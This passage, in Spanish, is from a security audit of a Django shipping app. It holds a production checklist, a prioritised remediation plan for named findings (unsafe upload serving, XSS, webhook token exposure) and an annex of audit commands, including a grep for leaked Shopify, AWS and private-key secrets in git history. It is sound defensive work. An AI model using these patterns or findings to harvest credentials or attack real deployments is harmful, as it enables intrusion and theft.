- Tokens públicos: `secrets.token_urlsafe(9)[:12]` (72 bits) con unicidad; contraseñas iniciales con `secrets`; `random` solo para barajar el reparto de carriers.

---

## 9. Pendiente de confirmar en producción (checklist para Chema)

- [ ] `.env` del VPS: `TORRE_HTTPS=1`, `TORRE_DEBUG=0`, `TORRE_SECRET_KEY` propia (≥ 50 chars), `ENVIA_WEBHOOK_SECRET` no vacío, tokens de webhooks e impresión largos (`secrets.token_urlsafe(32)`), `chmod 600 .env`.
- [ ] Que no existan en la BD de prod los usuarios de `seed_demo` (`admin`, `mesa1`, `piso1`, `jefe`, `karina`, `mario`, `nocturno`) o que sus contraseñas/PINs no sean las del repo.
- [ ] Caddy en el mismo host que gunicorn y si manda `X-Forwarded-For`; backend de caché (hoy LocMem por worker).
- [ ] Permisos de `/srv/torre/backups`, `~/.s3cfg`, `vapid_private.pem`, `/var/log/torre`.
- [ ] Si las tiendas Shopify conectadas comparten signing secret (misma app) — afecta M-08.
- [ ] Valor real de `RASTREO_REPORTE_FORMULARIO` (si está en True, H-01 es explotable sin cuenta).
- [ ] Versión de Django y dependencias instaladas en el venv de prod (`pip freeze`) frente a `requirements.lock`; versión de Python del VPS (paquete de distro y sus parches).
- [ ] Rotación de los tokens de webhooks/impresión tras moverlos fuera de la URL.
- [ ] PC de bodega del agente de impresión: versión de CUPS/macOS o Ubuntu parchada (octubre 2026), `cupsd` solo en `localhost`, sin colas compartidas, `cups-browsed` apagado (§6.3).
- [ ] Shopify: plan para pasar `SHOPIFY_API_VERSION` de `2026-01` (accesible hasta 2027-01-16) a `2026-10` antes de esa fecha; si Shopify pide evidencia de Nivel 2, tener respaldos cifrados y retención definida.

---

## 10. Plan de remediación priorizado

**Esta semana (cambios pequeños, cierran lo Alto):**
1. H-01: validación de imagen al subir + `content_type` fijo + `as_attachment` para no-imágenes + tope de tamaño. (Un helper en `core`, usado por los 11 puntos de captura.)
2. H-02: `json_script` en `empaque_pedido.html`. M-09: `escapejs` en los dos `onsubmit` y `textContent` en Bodega.
3. H-03: token de 99minutos a cabecera (re-registrar el webhook), `ENVIA_WEBHOOK_SECRET` obligatorio en prod, ventana de timestamp, no loguear `/hooks/` en el access log, rotar tokens.
4. H-04: aplicar `umbral_visto_bueno_mxn` (por encima → requiere aprobación del otro lado); M-11: lock + estado intermedio en `ejecutar_reembolso`.
5. M-03: IP real tras Caddy + caché compartida + 429.
6. M-14: Django 5.2.18, `urllib3 ≥ 2.8.0`, `sqlparse ≥ 0.6.0`, `multidict ≥ 6.9.1`, `aiohttp ≥ 3.14.5`, `cryptography ≥ 50.0.2`; regenerar `requirements.lock` desde el venv actualizado y desplegar con él (§6.2–6.3).
7. M-05: guarda `if not settings.DEBUG: raise CommandError` en `seed_demo`/`demo_en_vivo`.

**Dos semanas:**
8. M-01/M-02: `django-axes` (o throttle propio), bloqueo de PIN por fallos, validadores de contraseña completos + `validate_password` en el alta, longitud ≥ 12.
9. M-04: invertir defaults (`DEBUG` apagado por defecto, llave obligatoria si no es dev, HMAC nunca condicionado a `DEBUG`).
10. M-07: validar `*.myshopify.com`; 2FA TOTP para Mesa y `/admin/`; sub-rol admin de Mesa para secretos/tarifario/usuarios/ajustes por CSV.
11. M-08: `X-Shopify-Shop-Domain`, `updated_at` monotónico, 404 uniforme.
12. M-06: cifrar dumps y campos de token, bucket y llave separados para respaldos, retención.
13. M-10/M-12/M-13: límites de subida (Caddy + servidor), rangos máximos y streaming en exports, expiración de sesión.

**Estructural (1–2 meses):**
14. CSP con nonces (mover los 51 handlers inline y ~20 scripts a archivos/`addEventListener`), `Permissions-Policy`, una sola fuente de cabeceras (Django o Caddy).
15. Retención: purga de `WebhookEvento.payload` (p. ej. 90 días, conservando ids), de `raw` de guías y de evidencias según política; registro de tratamiento LFPDPPP.
16. Caducidad/revocación de tokens de rastreo y etiqueta; menos PII en la página del repartidor.
17. Hardening systemd, `--max-requests`, logrotate, `pip-audit` en CI con lock por hashes y revisión mensual de dependencias (Django publica security releases el primer martes de cada mes).
18. GET sin efectos en Piso; `Cliente.activo` en `portal_requerido`; evidencias internas fuera del portal; CSV con neutralización de fórmulas.
19. Endurecer la PC de bodega (CUPS local, sin compartir, parches) y separar bucket/llave de respaldos con cifrado del lado cliente (§6.3).
20. Planear Python ≥ 3.12 en el VPS antes de migrar a Django 6.x (CSP nativo), con fin de soporte de 5.2 en abril 2028.

---

## 11. Anexo: herramientas y reproducción

```bash
# Dependencias (venv aparte para no tocar el del proyecto)
python3 -m venv /tmp/sec && /tmp/sec/bin/pip install pip-audit bandit semgrep
/tmp/sec/bin/pip-audit -r requirements.lock --no-deps --desc on
# → 13 vulnerabilidades en urllib3 2.7.0, sqlparse 0.5.5, multidict 6.7.1

# Análisis estático
/tmp/sec/bin/bandit -r apps torre_project deploy scripts -x '*/tests/*,*/migrations/*' -ll
# → 0 High, 2 Medium (B108 tempdir en el agente, B310 urlopen), 43 Low (B110 try/except/pass, B311 random en reparto, B603 subprocess)
/tmp/sec/bin/semgrep --config p/django --config p/python --config p/secrets --config p/owasp-top-ten \
  --exclude tests --exclude migrations --exclude venv --exclude static apps torre_project deploy templates
# → 63 resultados: 23 csv-writer-injection (B-02), 18 django-no-csrf-token (falsos positivos: todas las formas llevan csrf_token),
#   22 directly-returned-format-string (regla de Flask, no aplica)

# Django deployment checklist (entorno de producción simulado)
TORRE_DEBUG=0 TORRE_HTTPS=1 TORRE_SECRET_KEY=<llave larga> TORRE_ALLOWED_HOSTS=torre.ejemplo.mx \
  venv/bin/python manage.py check --deploy
# → solo security.W008 (SSL redirect, lo hace Caddy) y W021 (HSTS preload)

# Greps clave
grep -rn "csrf_exempt" apps --include='*.py' | grep -v tests          # 4: webhooks + API agente
grep -rn "|safe\|mark_safe\|autoescape off" apps templates             # 2 |safe (H-02, manuales)
grep -rn "requests\.\(get\|post\|request\)" apps --include='*.py' | grep -vc "timeout="   # 0 sin timeout
grep -rn "FILES" apps --include='*.py' | grep -v tests                  # 11 puntos de subida (H-01)
git log -p --all | grep -E "shpat_[A-Za-z0-9]{20,}|AKIA[0-9A-Z]{16}|BEGIN (RSA|EC) PRIVATE KEY"   # solo valores de prueba
```

Confirmación de comportamiento de Django 5.2.17 usada en H-01 (ejecutada en el venv del proyecto): `FileResponse.set_headers` toma `filename` de `filelike.name`, deduce `Content-Type` con `mimetypes.guess_type` (`.svg → image/svg+xml`, `.html → text/html`) y manda `Content-Disposition: inline; filename=…` cuando `as_attachment=False`.

*Revisión realizada con Claude (Fable 5.1) el 2026-10-15; hallazgos verificados en código línea por línea; sin cambios al repositorio salvo este archivo.*
